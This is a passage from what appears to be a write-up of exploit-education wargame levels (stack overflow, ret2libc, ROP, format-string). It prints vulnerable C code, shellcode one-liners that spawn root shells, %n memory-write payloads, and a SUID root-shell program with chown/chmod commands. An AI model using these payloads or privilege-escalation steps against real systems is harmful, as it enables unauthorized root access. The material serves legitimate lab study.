class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">99</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80' + '0' * 21 + '</span><span class="se">\x</span><span class="s2">BF</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08'"</span> | ./stack5
</code></pre></div>    </div>
  </li>
  <li>If we pipe all of that into stack5, we expect to receive a shell back, but instead we get a segmentation fault. The reason is that in our shellcode we have a bunch of push instructions that when executed will put things on the stack basically overwriting instructions already there.</li>
  <li>To prevent that, we have to ensure that $esp is pointing to a proper location to not interfere with our code when stuff is pushed into the stack. What we can do is moving the register back so that it will leave enough space for all the pushes in our code. The instruction can be like <code class="language-plaintext highlighter-rouge">add $0x10, $esp</code>, which translates to opcode \x83\xc4\x10.</li>
  <li>We prepend this to our code, obtaining
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python <span class="nt">-c</span> <span class="s2">"print '</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">c4</span><span class="se">\x</span><span class="s2">10</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">06</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">68/tty</span><span class="se">\x</span><span class="s2">68/dev</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">b9</span><span class="se">\x</span><span class="s2">12</span><span class="se">\x</span><span class="s2">27</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">05</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">68//sh</span><span class="se">\x</span><span class="s2">68/bin</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">99</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80' + '0' * 18 + '</span><span class="se">\x</span><span class="s2">BF</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08'"</span> | ./stack5
</code></pre></div>    </div>
  </li>
  <li>Running this code clearly returns a shell that is root (you can check it with the command whoami).</li>
</ol>

<h3 id="stack06">[Stack06]</h3>
<p>Now there are restrictions on the return address.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">getpath</span><span class="p">(){</span>
    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">ret</span><span class="p">;</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"input path please: "</span><span class="p">);</span> <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>

    <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>

    <span class="n">ret</span> <span class="o">=</span> <span class="n">__builtin_return_address</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>

    <span class="k">if</span><span class="p">((</span><span class="n">ret</span> <span class="o">&amp;</span> <span class="mh">0xbf000000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xbf000000</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"bzzzt (%p)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">ret</span><span class="p">);</span>
        <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"got path %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
    <span class="n">getpath</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div></div>

<blockquote>
  <p>return-to-libc: this attack usually uses a buffer overflow to replace a return address so that it points to another routine already in memory (meaning taken from a library), so the attacker doesn’t need to inject its own code. These target library is usualy libc, because it is almost always linked and contains functions like system that can be used to execute shell commands. Check out a great explanation in Performing a ret2libc Attack by InVoLuNTaRy</p>
</blockquote>

<blockquote>
  <p>C calling convention: arguments of the function are pushed on the stack, in right-to-left order (meaning that last argument is pushed first). Integers and addresses are returned in the EAX register; registers EAX, ECX, and EDX are caller-saved, and the rest are callee-saved.</p>
</blockquote>

<ol>
  <li>The approach to exploit this code could be the same as in the last challenge, but there is an additional trick: we can’t modify the $eip to an instruction in the stack, because the <code class="language-plaintext highlighter-rouge">(ret &amp; 0xbf000000) == 0xbf000000</code> makes sure that addresses in the stack will not be accepted as return addresses. We know that the stack is in that address space thanks to <code class="language-plaintext highlighter-rouge">gdb &gt; info proc map</code></li>
  <li>By running <code class="language-plaintext highlighter-rouge">gdb &gt; disas getpath</code> we can look into the assembly code of the <code class="language-plaintext highlighter-rouge">getpath</code> method. We see right before the call to the gets instruction that the buffer is loaded from <code class="language-plaintext highlighter-rouge">$ebp-0x4C</code>. We can not look for a gadget to jump to $eax, because $eax is changed multiple times during the execution. However the same location is loaded into $edx right before returning, and so finding a jump to that register could be a solution. But using <code class="language-plaintext highlighter-rouge">msfelfscan</code> doesn’t return any useful gadget.</li>
  <li>Therefore we try to approach the problem with a <code class="language-plaintext highlighter-rouge">ret2libc</code> attack. We want to invoke the system function, pass the proper command to be executed to it, and make it properly return to the exit function.</li>
  <li>To locate system and exit in the library loaded by stack6, we can launch stack6 with gdb and use <code class="language-plaintext highlighter-rouge">gdb &gt; print system</code> and <code class="language-plaintext highlighter-rouge">gdb &gt; print exit</code>. This tells us that system is located at address 0xb7ecffb0, and exit at 0xb7ec60c0.</li>
  <li>Our call to system should result to spawning a shell, and to do this we need to pass a pointer to a string containing the “/bin/sh” command to be executed. We could find this string in different locations: the first one that comes to mind might be the buffer itself. The only problem in this case is that we should pass the pointer to the start of the buffer, and that is not a fixed value.</li>
  <li>As alternative, we look at environment variables: when a program is launched, the variables are put at the end of the stack, and they have a static address. We can either define our own variable, with <code class="language-plaintext highlighter-rouge">export PWN=/bin/sh</code>, or look if a variable pointing to the shell already exists.</li>
  <li>To get the address of the variable, we can start gdb, reach a breakpoint in stack6 and run <code class="language-plaintext highlighter-rouge">gdb &gt; x/10s *((char **)environ)</code>, changing the amount of shown variables until we find the one we are interested in.</li>
  <li>In our case, we have an existing <code class="language-plaintext highlighter-rouge">SHELL</code> variable located at 0xbffff8a9. To note is that we are only interested in the actual content of the variable, but in memory it is stored as a single string of the form <code class="language-plaintext highlighter-rouge">VARNAME=xxxxxxxx</code>. This means that to our address we have to add a little offset to leave out the name: “SHELL=” has 6 characters, so we add 6 to the address, obtaining 0xbffff8af</li>
  <li>Our payload will have the following structure:
    <ul>
      <li>Buffer filler (80 bytes)</li>
      <li>Pointer to system to overwrite $eip</li>
      <li>Pointer to exit as the address to which system should jump when returning</li>
      <li>Pointer to the content of SHELL as system argument</li>
      <li>Whatever as exit argument</li>
    </ul>
  </li>
  <li>
    <p>This is the result:</p>

    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python <span class="nt">-c</span> <span class="s2">"print 'A' * 80 + '</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ec</span><span class="se">\x</span><span class="s2">b7' + '</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">60</span><span class="se">\x</span><span class="s2">ec</span><span class="se">\x</span><span class="s2">b7' + '</span><span class="se">\x</span><span class="s2">af</span><span class="se">\x</span><span class="s2">f8</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">bf' + '</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff'"</span> | ./stack6
</code></pre></div>    </div>
  </li>
  <li>Executing the previous command should result in a root shell. However, on my system it does not work. Might be the pointers slightly off, or something else. Honestly, I’ve no idea.</li>
</ol>

<p>A nice addition to this challenge is to make system give root permissions to whatever we want. This is not my idea, but sadly I can’t find the source anymore. The approach is the same as the rest of the challenge, we just change the command that we pass to system. A nice example is writing a small C program that calls a shell with the SUID bit set:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">gid_t</span> <span class="n">gid</span><span class="p">;</span>
        <span class="n">uid_t</span> <span class="n">uid</span><span class="p">;</span>

        <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
        <span class="n">uid</span> <span class="o">=</span> <span class="n">geteuid</span><span class="p">();</span>

        <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
        <span class="n">setresuid</span><span class="p">(</span><span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">);</span>

        <span class="n">system</span><span class="p">(</span><span class="s">"/bin/bash"</span><span class="p">);</span>
    <span class="p">}</span>
</code></pre></div></div>

<p>We then compile the file and create an environment variable that will change the owner and the permissions of the binary: <code class="language-plaintext highlighter-rouge">export SUID="/bin/chown root:root /home/user/shell; /bin/chmod 4755 /home/user/shell"</code>. With the approach explained in the previous steps we retrieve the pointer to the string command, and we pass that as argument to system. After running properly, our binary file should have root owner and SUID set, and running it will result in a root shell.</p>

<h3 id="stack-07">[Stack 07]</h3>
<p>Looking through the disassembled program for specific instructions.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">char</span> <span class="o">*</span><span class="nf">getpath</span><span class="p">(){</span>
    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">ret</span><span class="p">;</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"input path please: "</span><span class="p">);</span> <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>

    <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>

    <span class="n">ret</span> <span class="o">=</span> <span class="n">__builtin_return_address</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>

    <span class="k">if</span><span class="p">((</span><span class="n">ret</span> <span class="o">&amp;</span> <span class="mh">0xb0000000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xb0000000</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"bzzzt (%p)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">ret</span><span class="p">);</span>
        <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"got path %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">strdup</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
    <span class="n">getpath</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div></div>

<blockquote>
  <p>ROP chains: taking control of the call stack in a program, it is possible to make calls to specific sequences of instructions (called gadgets) alredy present in the code, that usually end with a return so that the following instruction might also be a call to another gadget. Chaining gadgets together it is possible to perform arbitrary operations on a machine.</p>
</blockquote>

<ol>
  <li>This level has the same setup as the previous one, but the non-executable part of the stack is much larger, causing our pool of possible return addresses to get much smaller. We will therefore try to use the same approach as in Stack 5, by finding a gadget that will allow us to jump at the proper place.</li>
  <li>If we do a disassemble with <code class="language-plaintext highlighter-rouge">gdb &gt; disas getpath</code> we can see that our buffer is stored at <code class="language-plaintext highlighter-rouge">$ebp-0x4c</code>, and that this address is loaded into $eax just before the method returns. This means that the value in $eax will still be there when we will be looking at the return address, meaning we could aim at returning exactly at that specific address.</li>
  <li>To find a way to jump to $eax we look for possible gadgets in our code. To do that we execute <code class="language-plaintext highlighter-rouge">msfelfscan -f ~/stack7 -j eax</code>, meaning that we are looking in stack7 for code that jumps to $eax, being it a call, a return or whatever else would result in reaching that address. The script tells us that at address 0x080484bf there is a call to $eax that does exactly what we need</li>
  <li>
    <p>With the usual service we check how many bytes we have to fill to go from the buffer to $eip, and the result is 80. We build our payload with the same shellcode we already used, then pad it with 25 bytes to reach the position of $eip, and as last element we give the address of our gadget:</p>

    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> python <span class="nt">-c</span> <span class="s2">"print '</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">06</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80' + '</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">68/tty</span><span class="se">\x</span><span class="s2">68/dev</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">b9</span><span class="se">\x</span><span class="s2">12</span><span class="se">\x</span><span class="s2">27</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">05</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80' + '</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">68//sh</span><span class="se">\x</span><span class="s2">68/bin</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">99</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80' + 'A' * 25 + '</span><span class="se">\x</span><span class="s2">bf</span><span class="se">\x</span><span class="s2">84</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08'"</span> | ./stack7
</code></pre></div>    </div>
  </li>
  <li>Upon executing this, we will be rewarded with a root shell.</li>
</ol>

<h3 id="format-00">[Format 00]</h3>
<p>String supplied directly to printing functions can contain malicious formatting</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">vuln</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">string</span><span class="p">){</span>
    <span class="k">volatile</span> <span class="kt">int</span> <span class="n">target</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>

    <span class="n">target</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="n">sprintf</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">string</span><span class="p">);</span>
    
    <span class="k">if</span><span class="p">(</span><span class="n">target</span> <span class="o">==</span> <span class="mh">0xdeadbeef</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"you have hit the target correctly :)</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
    <span class="n">vuln</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
<span class="p">}</span>
</code></pre></div></div>

<ol>
  <li>
    <p>This task can be solved with a simple overflow: fill the buffer with whatever, put the expected value in the bytes that will act as overflow and overwrite the target variable. Remember that the system is little endian and therefore the bytes have to be passed “backwards”. Also, the string has to be passed as parameter, and not piped into stdin.</p>

    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ./format0 <span class="sb">`</span>python <span class="nt">-c</span> <span class="s2">"print 'A' * 64 + '</span><span class="se">\x</span><span class="s2">ef</span><span class="se">\x</span><span class="s2">be</span><span class="se">\x</span><span class="s2">ad</span><span class="se">\x</span><span class="s2">de'"</span><span class="sb">`</span>
</code></pre></div>    </div>
  </li>
</ol>

<h3 id="format-01">[Format 01]</h3>
<p>Modify arbitrary memory locations</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="n">target</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">vuln</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">string</span><span class="p">){</span>
    <span class="n">printf</span><span class="p">(</span><span class="n">string</span><span class="p">);</span>
    
    <span class="k">if</span><span class="p">(</span><span class="n">target</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"you have modified the target :)</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
    <span class="n">vuln</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
<span class="p">}</span>
</code></pre></div></div>

<blockquote>
  <p>Format Strings: this string contains both text and format parameters, that are pushed on the stack and popped by the calling function. This function retrieves first the format string itself, and while parsing it pops the other values from the stack and treats them as defined by the format. Following formats are the most popular: %d for int, %u for uint, %s for *char.
Interesting formats are %x for hex and %n for numbers of bytes written so far: with the first one it is possible to force the popping of values from the stack, because the string parsing does not know that what is being popped is not a legitimate parameter; combining this with the second one it is possible to force writing on a specific address, just by popping until that address is on the top of the stack and then invoking %n so that it will write its result there.</p>
</blockquote>

<ol>
  <li>The first thing that we need to do is to find out where target is, so that we know which at address we have to write. To do this we can use <code class="language-plaintext highlighter-rouge">objdump -t format1 | grep target</code>, which will tell us that the variable is stored at address 0x08049638</li>
  <li>The goal is to use this address as parameter for a %n operation: to make this work we need to crawl along the stack and pop all that we find until that address is on the top.</li>
  <li>
    <p>To find out how many 4-bytes blocks we have to pop, we do some bruteforcing: we spam format1 with an input that is easy to recognize, like ‘AAAA’ (that corresponds to 41414141 in ASCII hex), and we pop a big number of blocks by appending a bunch of ‘%x’ to the string:</p>

    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ./format1 <span class="sb">`</span>python <span class="nt">-c</span> <span class="s2">"print 'AAAA' + '%x' * 150"</span><span class="sb">`</span>
</code></pre></div>    </div>
  </li>
  <li>The result is an ugly bunch of numbers, corresponding to the content of the stack. If we look at it with a bit of attention, we can identify the 41414141, towards the end. We repeat the spamming decreasing the number of ‘%x’ that we print, until the recognizable pattern is at the last 4 bytes that we pop. In this case, 142 is the perfect number.</li>
  <li>While decreasing the number of pops that we do, there are alignment problems that might arise. We need to be able to control exactly the last 4 bytes, so it might be needed to modify a bit our recognizable patters, like ‘AABBCCDD’, so that even if the alignment is not perfect we should be able to identify 4 consecutive byte shat we can take control of.</li>
  <li>
    <p>When we have the 4 bytes under control, we change them: instead of our known pattern, we put there the address of target that we retrieved earlier. As we are using python, hex values are written with backslash and x, and we have to keep an eye on the endianness:</p>

    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ./format1 <span class="sb">`</span>python <span class="nt">-c</span> <span class="s2">"print '</span><span class="se">\x</span><span class="s2">38</span><span class="se">\x</span><span class="s2">96</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08' + '%x' * 142"</span><span class="sb">`</span>
</code></pre></div>    </div>
  </li>
  <li>
    <p>The last step is to have something written to that address: to do this we swap the last ‘%x’ with a ‘%n’, so that the address will be popped and used as a pointer to write the amount of bytes that have been written until now. The challenge is solved.</p>

    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ./format1 <span class="sb">`</span>python <span class="nt">-c</span> <span class="s2">"print '</span><span class="se">\x</span><span class="s2">38</span><span class="se">\x</span><span class="s2">96</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08' + '%x' * 141 + '%n'"</span><span class="sb">`</span>
</code></pre></div>    </div>
  </li>
</ol>

<h3 id="format-02">[Format 02]</h3>
<p>Write specific values in memory</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="n">target</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">vuln</span><span class="p">(){</span>
    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>

    <span class="n">fgets</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">),</span> <span class="n">stdin</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
    
    <span class="k">if</span><span class="p">(</span><span class="n">target</span> <span class="o">==</span> <span class="mi">64</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"you have modified the target :)</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"target is %d :(</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">target</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
    <span class="n">vuln</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div></div>

<blockquote>
  <p>Counting format strings: by providing a number between the percentage and the letter, the resulting format string will write that amount of elements. This means that it is possible to control what is written by %n: for example by using %Xu%n the result will be %n writing exactly value X because that’s the amount of bytes that have been outputted.</p>
</blockquote>

<ol>
  <li>The challenge is similar to the previous one, but this time we have to write a specific value into target, and not just a random one. Again, we start using <code class="language-plaintext highlighter-rouge">objdump -t format2 | grep target</code> to find out that target is at address 0x080496e4</li>
  <li>
    <p>Time to spam format2 to find out how many pops we have to do to get the target address at the right place at the top of the stack:</p>

    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> python <span class="nt">-c</span> <span class="s2">"print 'AAAA' + '%x'*20"</span> <span class="o">&gt;</span> /tmp/format2.in
 ./format2 &lt; /tmp/format2.in
</code></pre></div>    </div>
  </li>
  <li>
    <p>This time, turns out that we are looking really close, as the right amount of pops is 4. We swap our pattern with the target address, we remove a pop and instead put a ‘%n’ in there.</p>

    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> python <span class="nt">-c</span> <span class="s2">"print '</span><span class="se">\x</span><span class="s2">e4</span><span class="se">\x</span><span class="s2">96</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08' + '%x%x%x' + '%n'"</span> <span class="o">&gt;</span> /tmp/format2.in
 ./format2 &lt; /tmp/format2.in
</code></pre></div>    </div>
  </li>
  <li>This time we should see that a new value has been written to our target: the target has the value 23. Now it’s just a matter to convince the system to print more bytes without popping more stuff from the stack.</li>
  <li>
    <p>To do that we make one of our ‘%x’ pad its popped value with the amount of bytes we are missing. It might be necessary to try different values until we find the correct amount of padding (remember that target is a hex value).</p>

    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> python <span class="nt">-c</span> <span class="s2">"print '</span><span class="se">\x</span><span class="s2">e4</span><span class="se">\x</span><span class="s2">96</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08' + '%44x%x%x' + '%n'"</span> <span class="o">&gt;</span> /tmp/format2.in
 ./format2 &lt; /tmp/format2.in
</code></pre></div>    </div>
  </li>
  <li>As soon as we get the correct amount of bytes printed out, target will be modified to contain the value 64 and allowing us to finish the challenge.</li>
</ol>

<h3 id="format-03">[Format 03]</h3>
<p>Control what data is being written to the process memory.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="n">target</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">printbuffer</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">string</span><span class="p">){</span>
    <span class="n">printf</span><span class="p">(</span><span class="n">string</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">vuln</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>

    <span class="n">fgets</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">),</span> <span class="n">stdin</span><span class="p">);</span>

    <span class="n">printbuffer</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
    
    <span class="k">if</span><span class="p">(</span><span class="n">target</span> <span class="o">==</span> <span class="mh">0x01025544</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"you have modified the target :)</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"target is %08x :(</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">target</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
    <span class="n">vuln</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div></div>

<ol>
  <li>Once again, we build on the previous challenge: we have to write a specific value, and this time we can’t do it on a single write but need to split it on multiple %x-%n runs. We start using <code class="language-plaintext highlighter-rouge">objdump -t format3 | grep target</code> to find out that target is at address 0x080496f4</li>
  <li>Next step, spamming format3 to find out how many pops we have to do to get the target address at the right place at the top of the stack:
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> python <span class="nt">-c</span> <span class="s2">"print 'AAAA' + '%x'*20"</span> <span class="o">&gt;</span> /tmp/format3.in
 ./format3 &lt; /tmp/format3.in
</code></pre></div>    </div>
  </li>
  <li>Correct pop amount is 12. We swap our pattern with the target address, we remove a pop and instead put a ‘%n’ in there.
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> python <span class="nt">-c</span> <span class="s2">"print '</span><span class="se">\x</span><span class="s2">f4</span><span class="se">\x</span><span class="s2">96</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08' + '%x%x%x%x%x%x%x%x%x%x%x' + '%n'"</span> <span class="o">&gt;</span> /tmp/format3.in
 ./format3 &lt; /tmp/format3.in
</code></pre></div>    </div>
  </li>
  <li>This results in writing target lowest byte pair with 41. Therefore we need to add a couple of bytes in what we print with the ‘%x’ to increase that value:
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> python <span class="nt">-c</span> <span class="s2">"print '</span><span class="se">\x</span><span class="s2">f4</span><span class="se">\x</span><span class="s2">96</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08' + '%4x%x%x%x%x%x%x%x%x%x%x' + '%n'"</span> <span class="o">&gt;</span> /tmp/format3.in
 ./format3 &lt; /tmp/format3.in
</code></pre></div>    </div>
  </li>
